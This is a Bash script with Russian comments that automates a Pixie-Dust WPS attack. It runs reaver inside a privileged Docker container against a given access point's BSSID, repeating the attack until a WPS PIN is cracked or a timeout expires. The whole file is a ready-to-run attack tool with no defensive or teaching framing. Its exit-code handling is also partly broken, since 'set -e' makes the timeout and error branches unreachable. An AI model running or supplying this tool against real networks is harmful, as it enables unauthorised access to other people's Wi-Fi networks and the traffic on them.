#!/bin/bash
#
# wps.sh - Атака Pixie-Dust на WPS с помощью reaver
#
# Использование: $0 <interface> <bssid> <timeout_seconds>
# Пример:
#   $0 wlan0mon AA:BB:CC:DD:EE:FF 300  # Атака в течение 5 минут
#
# Логи сохраняются в wifi_data/wps/<timestamp>-wps.log

set -euo pipefail

# Проверка аргументов
if [ $# -ne 3 ]; then
    echo "Usage: $0 <interface> <bssid> <timeout_seconds>" >&2
    echo "Example: $0 wlan0mon AA:BB:CC:DD:EE:FF 300" >&2
    exit 1
fi

INTERFACE="$1"
BSSID="$2"
TIMEOUT="$3"

# Проверка, что timeout - число
if ! [[ "$TIMEOUT" =~ ^[0-9]+$ ]]; then
    echo "ERROR: Timeout must be a positive integer" >&2
    exit 1
fi

# Валидация BSSID
if ! [[ "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
    echo "ERROR: Invalid BSSID format: $BSSID" >&2
    exit 1
fi

# Параметры
DOCKER_IMAGE="wifi:latest"
DATA_DIR="wifi_data"
WPS_DIR="$DATA_DIR/wps"

# Функция проверки интерфейса
check_interface_exists() {
    docker run --rm --net=host --cap-drop=ALL --cap-add=NET_ADMIN --cap-add=NET_RAW \
        $DOCKER_IMAGE ip link show "$1" >/dev/null 2>&1
    return $?
}

if ! check_interface_exists "$INTERFACE"; then
    echo "ERROR: Interface '$INTERFACE' not found or not accessible" >&2
    exit 1
fi

# Создаём директорию
mkdir -p "$WPS_DIR"

# Генерируем timestamp и путь к логу
TIMESTAMP=$(date '+%Y%m%d_%H%M%S')
LOG_FILE="$WPS_DIR/${TIMESTAMP}-wps.log"

echo "Starting Pixie-Dust WPS attack on BSSID: $BSSID" >&2
echo "Interface: $INTERFACE" >&2
echo "Timeout:   $TIMEOUT seconds" >&2
echo "Log:       $LOG_FILE" >&2

# Команда reaver
REAVER_CMD="reaver -i $INTERFACE -b $BSSID -F -w -N -d 2 -l 5 -t 20"

# Bash-скрипт внутри Docker: цикл попыток до timeout или нахождения PIN
INNER_SCRIPT="
START_TIME=\$(date +%s)
END_TIME=\$((\$START_TIME + $TIMEOUT))

while [ \$(date +%s) -lt \$END_TIME ]; do
    $REAVER_CMD >> /$LOG_FILE 2>&1
    EXIT_CODE=\$?
    
    if grep -q -E 'Pin cracked|WPS PIN' /$LOG_FILE; then
        echo 'WPS PIN found! Stopping attack.' >> /$LOG_FILE
        exit 0
    fi
    
    sleep 5
done

echo 'Timeout reached without finding PIN.' >> /$LOG_FILE
exit 124  # Код timeout
"

# Запуск в Docker
docker run --rm \
    --name "reaver-${TIMESTAMP}" \
    --net=host \
    --cap-add=NET_ADMIN \
    --cap-add=NET_RAW \
    --cap-add=SYS_MODULE \
    --cpus="0.5" \
    --memory="1g" \
    -v "$(pwd)/$DATA_DIR/wps:/$DATA_DIR/wps" \
    $DOCKER_IMAGE \
    bash -c "$INNER_SCRIPT"

# Проверка результата
EXIT_CODE=$?
if [ $EXIT_CODE -eq 0 ]; then
    echo "WPS attack completed: PIN found!" >&2
elif [ $EXIT_CODE -eq 124 ]; then
    echo "WPS attack timed out without finding PIN" >&2
else
    echo "ERROR: reaver failed with exit code $EXIT_CODE" >&2
    cat "$LOG_FILE" >&2
    exit 1
fi

echo "Log saved to: $LOG_FILE" >&2
if grep -q -E 'Pin cracked|WPS PIN' "$LOG_FILE"; then
    grep -E 'Pin cracked|WPS PIN' "$LOG_FILE" >&2
fi